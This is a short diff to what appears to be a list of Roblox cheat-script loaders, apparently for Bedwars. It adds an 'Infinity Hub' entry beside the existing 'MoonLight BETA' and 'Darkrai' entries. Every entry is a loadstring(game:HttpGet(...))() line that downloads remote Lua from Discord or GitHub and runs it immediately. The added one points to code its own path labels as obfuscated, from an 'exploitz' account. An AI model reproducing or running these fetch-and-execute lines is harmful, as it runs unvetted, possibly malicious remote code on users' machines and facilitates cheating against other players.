@@ -50,6 +50,12 @@ MoonLight BETA:
 loadstring(game:HttpGet(("https://cdn.discordapp.com/attachments/980105264684478464/1002239072217092106/MoonLightBeta.txt"), true))()
 
 
+
+Infinity Hub:
+loadstring(game:HttpGet("https://raw.githubusercontent.com/bojoexploitz/yooo/main/itsobfuscated/InfinityHubTooOP", true))()
+
+
+
 Darkrai:
 loadstring(game:HttpGet("https://raw.githubusercontent.com/GamingScripter/bedwars/main/Script", true))()
 
